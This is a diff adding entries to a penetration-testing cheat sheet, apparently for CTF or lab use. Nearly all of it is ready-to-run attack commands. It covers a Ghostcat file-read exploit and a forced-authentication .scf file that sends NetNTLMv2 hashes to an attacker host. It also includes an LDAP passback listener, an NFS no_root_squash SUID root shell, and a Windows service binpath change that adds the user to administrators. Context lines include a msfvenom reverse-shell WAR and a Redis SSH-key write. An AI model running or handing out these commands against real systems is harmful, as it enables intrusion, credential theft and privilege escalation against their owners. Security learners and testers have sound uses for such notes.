@@ -39,6 +39,10 @@ sudo nmap -sU --top-ports 100 -T4 $IP -oN udp.nmap
 
 # rustscan alternative (faster discovery)
 rustscan -a $IP -- -sCV
+
+# port knocking - a filtered port that opens after a sequence (look in knockd.conf, a README, FTP)
+knock $IP 7469 8475 9842 && ssh <user>@$IP
+for p in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $p $IP; done      # no knock client needed
 ```
 
 ---
@@ -114,6 +118,7 @@ wpscan --url http://$IP -U <user> -P /usr/share/wordlists/rockyou.txt   # login 
 # WebDAV:  davtest -url http://<ip>   ;  curl -T shell.php http://<ip>/   (upload .txt then MOVE if filtered)
 # Jenkins /script (Groovy):  println 'id'.execute().text
 # Redis unauth -> SSH key:  config set dir /var/lib/redis/.ssh ; config set dbfilename authorized_keys ; set x '<pubkey>' ; save
+# Ghostcat (AJP 8009, CVE-2020-1938):  python3 ajpShooter.py http://$IP:8080 8009 /WEB-INF/web.xml read
 
 # Tomcat Manager -> WAR shell (defaults: tomcat:tomcat / tomcat:s3cret / admin:admin)
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o rev.war
@@ -195,6 +200,11 @@ nxc ldap $IP -u <user> -p <pass> --gmsa        # gMSA managed password (or gMSAD
 #   secretsdump.py -ntds ntds.dit -system system LOCAL
 runas /user:<dom>\administrator /savecred "cmd /c whoami"   # re-use a cmdkey-stored cred
 dir /R                                          # NTFS alternate data streams (Get-Content f -Stream x)
+# forced auth from a writable share - Explorer fetches the icon, leaking NetNTLMv2 to Responder
+printf '[Shell]\nCommand=2\nIconFile=\\\\%s\\share\\x.ico\n[Taskbar]\nCommand=ToggleDesktop\n' "$LHOST" > @pwn.scf
+smbclient //$IP/<share> -N -c 'put @pwn.scf'    # .url (URL=file://$LHOST/x.ico) or .lnk work too
+# LDAP passback - point a printer/appliance's LDAP server at you, its bind arrives in cleartext
+sudo nc -lvnp 389
 ```
 
 
@@ -280,11 +290,21 @@ sudo -u#-1 /bin/bash                           # CVE-2019-14287, when sudo -l sh
 # root 'tar ... *' in a writable dir -> touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'
 # restricted shell (rbash)? escape:
 ssh <user>@$IP -t bash --noprofile --norc      # or from inside: vi -> :set shell=/bin/sh :shell
+# NFS export with no_root_squash -> set the SUID bit from your box, it is honoured on theirs
+showmount -e $IP                               # look for (rw,no_root_squash); cat /etc/exports on target
+sudo mount -t nfs $IP:/export /mnt -o nolock && sudo cp /bin/bash /mnt/rootbash && sudo chmod +s /mnt/rootbash
+#   then on target:  /export/rootbash -p
+id                                             # disk -> debugfs /dev/sda1 (read/write any file) | adm -> /var/log | shadow
+# python import hijack: root script does 'import config' and its dir is writable -> drop config.py
 
 # Windows
 .\winpeas.exe
 whoami /priv                                  # look for SeImpersonate -> potato
 systeminfo                                    # then windows-exploit-suggester
+accesschk.exe -uwcqv <user> *                 # services you may reconfigure
+sc config <svc> binpath= "cmd /c net localgroup administrators <user> /add" && sc start <svc>
+#   Server Operators group members can do the above to any service = SYSTEM, no file dropped
+# open Squid proxy (3128/8080)? that is a free tunnel - proxychains conf:  http <ip> 3128
 ```
 
 ## Container escape
